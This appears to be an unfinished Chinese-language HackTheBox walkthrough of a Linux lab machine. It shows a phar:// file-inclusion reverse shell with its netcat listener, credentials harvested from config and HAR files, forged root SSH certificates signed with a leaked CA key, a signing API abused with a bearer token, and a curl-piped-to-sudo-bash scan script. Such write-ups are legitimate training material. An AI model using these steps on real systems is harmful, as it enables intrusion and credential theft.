---
tags:
  - HTB/Linux
  - HTB/Medium
---
## Summary

...

### Relevant Skills

- nmap
- SSH证书登陆
- ……

### Attack Path Overview

![attack-path](./../attackpath/HTB-template.png){ width='500' }


## External Recon - nmap

自用扫描脚本：[工作流](https://github.com/TimeLess613/workflow-scan4HTB/blob/main/workflow-scan4HTB.sh)  
`curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s <HTB-MachineName> <HTB_IP>`

开放端口：
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
```

## 攻击路径规划·漏洞分析

22端口SSH的版本较新，优先度放低。2222端口的版本在最近的漏洞regreSSHion的范围？不过[搜了下](https://www.wiz.io/blog/cve-2024-6387-critical-rce-openssh)似乎说 `32-bit glibc-based Linux distributions` 也要跑好几个小时，打靶不能是用这个吧。先看80端口的Web。


## 80端口

`http://itrc.ssg.htb/`

- 响应报头信息：nginx/1.18.0 (Ubuntu)，PHP/8.1.29
- robots.txt：无。获得信息：Apache/2.4.61 (Debian)
- .git/config：无
- 网页信息：一个关于SSH管理的服务中心
- 网页源码：无特别发现
- 网页功能：可以注册账户并登录，然后创建问题ticket，可以输入文本以及上传zip
- 子域枚举：无特别发现
- 目录枚举：有个`/api/`和`/uploads/`

### 研究网页功能

关于枚举到的两个目录

- 创建ticket，会用到`/api/create_ticket.php`
- 上传的zip可以点击下载，urlpath：`/uploads/a905e184db2abf65f2790c6e475a04a3ad9a8e27.zip`

ticket界面：

- ticket内容尝试简单XSS无效
- ticket界面的url：`http://itrc.ssg.htb/?page=ticket&id=12`，点击dashboard后变为 `page=dashboard`。对`id`参数尝试简单SQLi无效。考虑`page`参数的LFI。因为可行的话可进一步尝试LFI2RCE。


## Initial Access

删除`id`参数，访问 `http://itrc.ssg.htb/?page=ticket` 后页面显示 `Warning: Undefined array key "id" in /var/www/itrc/ticket.php on line 5` 然后重定向到首页（`http://itrc.ssg.htb/`）。

访问 `http://itrc.ssg.htb/index.php?page=api/create_ticket`（创建ticket的urlpath）后返回报错：
```
Notice: session_start(): Ignoring session_start() because a session is already active in /var/www/itrc/api/create_ticket.php on line 3

Warning: Cannot modify header information - headers already sent by (output started at /var/www/itrc/header.inc.php:1) in /var/www/itrc/api/create_ticket.php on line 31
```



访问 `http://itrc.ssg.htb/?page=pahr:///uploads/a905e184db2abf65f2790c6e475a04a3ad9a8e27.zip/rshell` 由于输错了，页面上方显示报错：`Warning: file_exists(): Unable to find the wrapper "pahr" - did you forget to enable it when you configured PHP? in /var/www/itrc/index.php on line 3`

访问 `http://itrc.ssg.htb/?page=phar://uploads/a905e184db2abf65f2790c6e475a04a3ad9a8e27.zip`返回`504 Gateway Time-out`，再次尝试：`http://itrc.ssg.htb/?page=phar://uploads/a905e184db2abf65f2790c6e475a04a3ad9a8e27.zip/rshell`

触发反弹shell。



```bash
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./rshell.php

└─$ zip rshell.zip rshell.php
```


```
└─$ nc -lvnp 1234       
listening on [any] 1234 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.27] 35696
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64 GNU/Linux
 06:50:51 up  2:28,  0 user,  load average: 2.21, 2.94, 5.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ ip a
/bin/sh: 4: ip: not found
$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.223.0.3  netmask 255.255.0.0  broadcast 172.223.255.255
        ether 02:42:ac:df:00:03  txqueuelen 0  (Ethernet)
        RX packets 1883029  bytes 593671249 (566.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1544957  bytes 468609514 (446.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 44373  bytes 2826005 (2.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 44373  bytes 2826005 (2.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

$ which python python3

$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@itrc:/$
```



```bash

www-data@itrc:/var/www/itrc/uploads$ cat /etc/passwd 
<SNIP>
msainristil:x:1000:1000::/home/msainristil:/bin/bash
zzinter:x:1001:1001::/home/zzinter:/bin/bash

www-data@itrc:/var/www/itrc/uploads$ ls /home/
msainristil  zzinter


www-data@itrc:/$ ls -iahl /
total 216K
606886 drwxr-xr-x   1 root root 4.0K Jul 23 14:22 .
606886 drwxr-xr-x   1 root root 4.0K Jul 23 14:22 ..
602968 -rwxr-xr-x   1 root root    0 Jul 23 14:22 .dockerenv
<SNIP>


www-data@itrc:/var/www/itrc$ ls
admin.php  assets             dashboard.php  filter.inc.php  header.inc.php  index.php     login.php   register.php      ticket.php              uploads
api        create_ticket.php  db.php         footer.inc.php  home.php        loggedin.php  logout.php  savefile.inc.php  ticket_section.inc.php
www-data@itrc:/var/www/itrc$ cat db.php
<?php

$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5rR5SG8uPd";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}





www-data@itrc:/var/www/itrc$ mysql -u jj -pugEG5rR5SG8uPd
ERROR 2002 (HY000): Can't connect to local server through socket '/run/mysqld/mysqld.sock' (2)




www-data@itrc:/var/www/itrc$ ss
bash: ss: command not found
www-data@itrc:/var/www/itrc$ netstat -notpl
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.11:45217        0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      -                    off (0.00/0/0)



www-data@itrc:/var/www/itrc/uploads$ ls -lt
total 1172
-rw-r--r-- 1 www-data www-data    1500 Aug  9 02:01 dfb186181741c431d712138a7d42618f8006e4c8.zip
-rw-r--r-- 1 www-data www-data     155 Aug  9 01:41 a5f8cfc1c28e2390d281b18e11626b251214a69a.zip
-rw-r--r-- 1 www-data www-data    3145 Aug  9 01:37 a5e4c1b82360c3af9a3ab1aa4cf842b23b9b4fb8.zip
-rw-r--r-- 1 www-data www-data     141 Aug  9 00:29 19c2180152cb129aed9fda8a9dd528cb475a57b6.zip
-rw-r--r-- 1 www-data www-data     162 Jul 25 12:48 88dd73e336c2f81891bddbe2b61f5ccb588387ef.zip
-rw-r--r-- 1 www-data www-data     162 Jul 25 11:30 21de93259c8a45dd2223355515f1ee70d8763c8a.zip
-rw-r--r-- 1 www-data www-data     162 Jul 25 11:28 b829beac87ea0757d7d3432edeac36c6542f46c4.zip
-rw-rw-r-- 1 www-data www-data     634 Feb  6  2024 e8c6575573384aeeab4d093cc99c7e5927614185.zip
-rw-rw-r-- 1 www-data www-data     275 Feb  6  2024 eb65074fe37671509f24d1652a44944be61e4360.zip
-rw-rw-r-- 1 www-data www-data 1162513 Feb  6  2024 c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
www-data@itrc:/var/www/itrc/uploads$ unzip c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
Archive:  c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
  inflating: itrc.ssg.htb.har        
www-data@itrc:/var/www/itrc/uploads$ unzip eb65074fe37671509f24d1652a44944be61e4360.zip
Archive:  eb65074fe37671509f24d1652a44944be61e4360.zip
  inflating: id_ed25519.pub          
www-data@itrc:/var/www/itrc/uploads$ 
www-data@itrc:/var/www/itrc/uploads$ unzip e8c6575573384aeeab4d093cc99c7e5927614185.zip
Archive:  e8c6575573384aeeab4d093cc99c7e5927614185.zip
  inflating: id_rsa.pub
```


在 `itrc.ssg.htb.har` 中搜索 `pass`，也可直接访问 `http://itrc.ssg.htb/uploads/itrc.ssg.htb.har`，可以发现 `"text": "user=msainristil&pass=82yards2closeit"`。



### 横向移动：msainristil

```bash
└─$ ssh msainristil@10.10.11.27
The authenticity of host '10.10.11.27 (10.10.11.27)' can't be established.
ED25519 key fingerprint is SHA256:PVHxOqGsN7oX50zMsl/3O2BPQ3u50UhffyNeJZuo2K4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.27' (ED25519) to the list of known hosts.
msainristil@10.10.11.27's password: 
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug  9 02:21:25 2024 from 10.10.16.23
msainristil@itrc:~$ id
uid=1000(msainristil) gid=1000(msainristil) groups=1000(msainristil)
```



```bash
msainristil@itrc:~$ ls
decommission_old_ca
msainristil@itrc:~$ ls -iahlt decommission_old_ca/
total 44K
<SNIP>
602696 -rw------- 1 msainristil msainristil 2.6K Jan 24  2024 ca-itrc
602695 -rw-r--r-- 1 msainristil msainristil  572 Jan 24  2024 ca-itrc.pub

msainristil@itrc:~/decommission_old_ca$ cat ca-*
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
RX3ajkx+O8cbBU4WMfQXutRVlDyV630oMPPVUrYm4SxZGJgEcq3nK6uQGPxXmAV/sMTNsm
A9QyX0p7GeHa+9AAAAEklUUkMgQ2VydGlmY2F0ZSBDQQ==
-----END OPENSSH PRIVATE KEY-----
ssh-rsa AAAAB<SNIP>hrlLs= ITRC Certifcate CA
```




此处涉及证书签名
https://www.ruanyifeng.com/blog/2020/07/ssh-certificate.html

```
msainristil@itrc:~/decommission_old_ca$ ssh-keygen
<SNIP>
msainristil@itrc:~/decommission_old_ca$ ssh-keygen -s ca-itrc -I root -n root ../.ssh/id_rsa.pub 
Signed user key ../.ssh/id_rsa-cert.pub: id "root" serial 0 for root valid forever
msainristil@itrc:~/decommission_old_ca$ ls -l ../.ssh/
total 16
-rw------- 1 msainristil msainristil 2602 Aug 10 07:14 id_rsa
-rw-r--r-- 1 msainristil msainristil 2011 Aug 10 07:43 id_rsa-cert.pub
-rw-r--r-- 1 msainristil msainristil  570 Aug 10 07:14 id_rsa.pub
-rw-r--r-- 1 msainristil msainristil  710 Aug 10 05:30 known_hosts
msainristil@itrc:~/decommission_old_ca$ ssh-keygen -L -f ../.ssh/id_rsa-cert.pub 
../.ssh/id_rsa-cert.pub:
        Type: ssh-rsa-cert-v01@openssh.com user certificate
        Public key: RSA-CERT SHA256:QrtAAEhrDHA7q6ZWXeffX+xNV66NiTHwQnpCR7xGd+U
        Signing CA: RSA SHA256:BFu3V/qG+Kyg33kg3b4R/hbArfZiJZRmddDeF2fUmgs (using rsa-sha2-512)
        Key ID: "root"
        Serial: 0
        Valid: forever
        Principals: 
                root
        Critical Options: (none)
        Extensions: 
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc
```

- 缺少 `-I` 参数的话会报错：Must specify key id (-I) when certifying。可以随便输入。

### 横向移动：root in container

将ssh密钥和签名了的公钥证书下载到kali后连接，虽然还是在刚刚的docker容器内，不过是root：
```
└─$ scp msainristil@10.10.11.27:.ssh/id* .
<SNIP>
└─$ ssh -i id_rsa root@10.10.11.27       
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 10 07:40:07 2024 from 127.0.0.1
root@itrc:~# id
uid=0(root) gid=0(root) groups=0(root)
root@itrc:~# ip a
-bash: ip: command not found
root@itrc:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.223.0.3  netmask 255.255.0.0  broadcast 172.223.255.255
        ether 02:42:ac:df:00:03  txqueuelen 0  (Ethernet)
        RX packets 2053026  bytes 615832711 (587.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1697139  bytes 501654404 (478.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 46645  bytes 3069254 (2.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 46645  bytes 3069254 (2.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@itrc:~# ls
root@itrc:~# ls -iahl
total 16K
606781 drwx------ 1 root root 4.0K Jul 23 14:22 .
606886 drwxr-xr-x 1 root root 4.0K Jul 23 14:22 ..
602715 lrwxrwxrwx 1 root root    9 Jul 23 14:22 .bash_history -> /dev/null
556117 -rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
556119 -rw-r--r-- 1 root root  161 Jul  9  2019 .profile
root@itrc:~# 
```


## flag: user

移动到 `zzinter` 家目录下获取user flag

```bash
root@itrc:~# cat /home/zzinter/user.txt 
d6310f12878c318f8e59eeaa682735dc
```

2222端口根据已知信息还不能成功连接


## Privilege Escalation

### Internal Recon

基础信息收集一把梭：

- IP、端口
- 用户家目录的隐藏文件：无
- `sudo -l`：没有sudo可执行
- SUID：无特别发现
- cron：`crontab -l`，`ls /etc/cron*`，无特别发现


```
zzinter@itrc:~$ cat sign_key_api.sh 
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

发现一个子域 `signserv.ssg.htb`，容器中的hosts文件没有，不过ping一下可以得知其IP为`172.223.0.1`
```
zzinter@itrc:~$ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.223.0.3     itrc

zzinter@itrc:~$ ping signserv.ssg.htb
PING signserv.ssg.htb (172.223.0.1) 56(84) bytes of data.
```

顺着刚刚公钥签名的思路，如果能

```
zzinter@itrc:~/.ssh$ bash sign.sh id_rsa.pub root root
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAge/wMmBttAlJHhrbU5mkUTcHItlXTnMwOTZS0NHe9MyYAAAADAQABAAABgQCgv6//567AL3OL4RFwih2wOlxbvP9at7IXRwsLDMByUTPZgeLX/1hx2LrQYOXZIplBcvcwc97y4pH2sRN+1jHYTg+x+79jXjqpQJsDwaJcUqlnMOEDTGK5fRZU4t4qIgNrRRmYBVbq8REAXlu3oqcvg02e8u1gQ3+9sVFDdIguB9mYjnOjfsvyEdCh4AYhqBQTJRNR+vmIweAheFWQCaanFEwIMOOvdqq/3GF3ITgsv0zoJkttwNd6RyCc1AhTEq6s10PBf8tByAJwhPYymdHL2Ix5e6SdK54lU448/O6dC/x5Cad60TKVttXMRr2JOwzlX6pGXR01prs41x9R6AXFuhS5PlsNGclvNQ8qTTZt3FcmUcFKqXCek8a4Y2ehs82HvP6JlSAf2n8bUOxJe+38tZk4l0muXnQS+mVki0ab3K54MDoMr524bBh3giD833HqUsqTLz4RAM94MQoNQD1VA7ZNfGq5N1dDXuDZWfdDXJFYP/XKTcC0ZpQTT7ymuHMAAAAAAAAANgAAAAEAAAAEcm9vdAAAAAgAAAAEcm9vdAAAAABmrd6Q//////////8AAAAAAAAAggAAABVwZXJtaXQtWDExLWZvcndhcmRpbmcAAAAAAAAAF3Blcm1pdC1hZ2VudC1mb3J3YXJkaW5nAAAAAAAAABZwZXJtaXQtcG9ydC1mb3J3YXJkaW5nAAAAAAAAAApwZXJtaXQtcHR5AAAAAAAAAA5wZXJtaXQtdXNlci1yYwAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAFMAAAALc3NoLWVkMjU1MTkAAABADYsFDlLcFuU1g3g/b1FwnTNpuvwtxRn+sUGipL0X3zN8ToOo+G5MblwPpS4E5ROYuY4svB60shvcnpCtn0KKCw== zzinter@itrc
zzinter@itrc:~/.ssh$ vi id_rsa-cert.pub
zzinter@itrc:~/.ssh$ ssh -i id_rsa root@172.223.0.1 -p 2222
root@172.223.0.1's password: 

zzinter@itrc:~/.ssh$ ssh -i id_rsa root@172.223.0.1    
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 10 07:33:50 2024 from 10.10.14.13
root@itrc:~# id
uid=0(root) gid=0(root) groups=0(root)
root@itrc:~# ls
root@itrc:~# ls -al /
total 2700
drwxr-xr-x   1 root root    4096 Jul 23 14:22 .
drwxr-xr-x   1 root root    4096 Jul 23 14:22 ..
-rwxr-xr-x   1 root root       0 Jul 23 14:22 .dockerenv
```



web项目文件夹中没有 `signserv`，所以可能在主机而不是

```bash
zzinter@itrc:~$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/zzinter/.ssh/id_rsa): 
Created directory '/home/zzinter/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/zzinter/.ssh/id_rsa
Your public key has been saved in /home/zzinter/.ssh/id_rsa.pub
<SNIP>

zzinter@itrc:~$ bash sign_key_api.sh .ssh/id_rsa.pub root support
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgyXQ2R4i3M7Yc3qzEDkJvMV/g9bJ43DIddDgDJZ3cEJsAAAADAQABAAABgQCyH556jBt9DeR5pTmxliyeYCXXyO5x0fd0MeZXmUJnM3E3p3S3IyUHDTTYen2rz8wyoRz+hmHzbqEWaqJmNSlRj3b6SPNBQUnWuCevbcuDj0UmILuohP1dPlXVEYHnyKhiYSTabjZe04Che19ZST+0T187J3oMGbYMOwatkhjIi6m1sYVjjsGCK8fhuAR4gWeCAPSH4BBnyQ9T9wQ7xr0CKNMCRbGj9CY/L8MBtEUCP6NvOrQ1jtsWeeQlZrgcbINuJNLNaGQ6B3cgQ+vYVCC7v4LaII3ckwEdasKu66Yw2lxeIlyPSqGA0XPv6CnDlE8ADNP1IZA7lIGkveM+Yp+usUWWUWtltbP8fGidnD+yv0zKQjgTvHJ5oH2xCIJQioPxF/k1ho73kn2nTjuAYhyYbgFffvsipvnv0BnizuHDPcVAlb0I1QQ3XcuRJhpZeynwfpeCPEUzT/A4s1RUfV1KsYrcZ/itNTaPOGfexlYgg5cc5sO7L7IfMw882Mqei40AAAAAAAAALgAAAAEAAAAEcm9vdAAAAAsAAAAHc3VwcG9ydAAAAABmrOb7//////////8AAAAAAAAAggAAABVwZXJtaXQtWDExLWZvcndhcmRpbmcAAAAAAAAAF3Blcm1pdC1hZ2VudC1mb3J3YXJkaW5nAAAAAAAAABZwZXJtaXQtcG9ydC1mb3J3YXJkaW5nAAAAAAAAAApwZXJtaXQtcHR5AAAAAAAAAA5wZXJtaXQtdXNlci1yYwAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAFMAAAALc3NoLWVkMjU1MTkAAABAZ503N8SWyJIkOk1dLDk2b9ZeJ2Pt+KlKfhocTENe5bapwfyRNRyr/9Ee1Su4bFCcgcPN6R+TCiyzHT3SJnROCA== zzinter@itrc
zzinter@itrc:~$ vim .ssh/id_rsa-cert.pub 
zzinter@itrc:~$ ssh -i .ssh/id_rsa support@172.223.0.1 -p 2222
<SNIP>
support@ssg:~$ id
uid=1000(support) gid=1000(support) groups=1000(support)
support@ssg:~$ ls
support@ssg:~$ ls -al
total 28
drwxr-x--- 4 support support 4096 Jun 21 18:11 .
drwxr-xr-x 4 root    root    4096 Jul 23 13:44 ..
lrwxrwxrwx 1 root    root       9 Jun 21 18:11 .bash_history -> /dev/null
-rw-r--r-- 1 support support  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 support support 3771 Jan  6  2022 .bashrc
drwx------ 2 support support 4096 Feb  7  2024 .cache
-rw-r--r-- 1 support support  807 Jan  6  2022 .profile
drwx------ 2 support support 4096 Feb  7  2024 .ssh
support@ssg:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 ssg resource.htb
172.223.0.3 itrc.ssg.htb
172.223.0.1 signserv.ssg.htb
<SNIP>
```



## flag: root


---

## 总结·后记

YYYY/MM/DD


www-data用户可以使用ifconfig命令，而之后的用户不行？

```bash
www-data@itrc:/var/www/itrc$ cat index.php
<?php session_start();

if (isset($_GET["page"]) and file_exists($_GET["page"] . ".php")){
    $page = $_GET["page"] . ".php";
} elseif (isset($_SESSION["username"])) {
    $page = "dashboard.php";
} else {
    $page = "home.php";
}

require_once "header.inc.php";

echo "<div class=\"main\">";
include_once $page;
echo "</div>";

require_once "footer.inc.php";
?>
```